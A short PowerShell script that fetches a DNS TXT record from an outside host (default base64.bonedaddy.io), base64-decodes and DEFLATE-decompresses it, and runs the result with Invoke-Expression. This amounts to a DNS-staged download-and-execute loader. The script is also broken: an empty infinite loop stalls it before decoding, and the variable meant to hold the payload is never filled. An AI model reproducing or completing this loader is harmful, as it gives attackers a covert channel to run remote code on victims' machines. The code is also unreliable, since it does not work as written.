# queries the given host_name for a TXT record expecting the value to be a base64 encoded DEFLATE compressed string
# base64 decoding was taken from # encoding from https://gist.github.com/vortexau/13de5b6f9e46cf419f1540753c573206

param (
    [string]$host_name = "base64.bonedaddy.io",
    [string]$dns_server = "8.8.8.8"
)

$dns_result = Resolve-DnsName -Name $host_name -Type TXT -Server $dns_server | Select-Object Strings
$base64_output = ''
$deconstructed_query = ''
# the element that contains the = sign
$final_element = ''
# all other elements
$remaining_elements = @()
# iterate over all elements to find the element containing the final base64 string (denoted by the =)
# all other parts
for ($i=0; $i -lt $dns_result.Strings.length; $i++) {
    if ($dns_result.Strings[$i] -match '=') {
        $final_element = $dns_result.Strings[$i]
    } else {
        $remaining_elements += $dns_result.Strings[$i]
    }
}

Write-Output "final element $final_element"
Write-Output "reamining elements $remaining_elements"

while (1 -eq 1) {
    for ($i = 1; $i -lt $remaining_elements.length; $i++) {

    }
}

# uncomment to debug
# Write-Host $base64_output

$data = [System.Convert]::FromBase64String($base64_output)
$ms = New-Object System.IO.MemoryStream
$ms.Write($data, 0, $data.Length)
$ms.Seek(0,0) | Out-Null
$sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
while ($line = $sr.ReadLine()) {  
    $deconstructed_query += $line
}

Invoke-Expression ($deconstructed_query)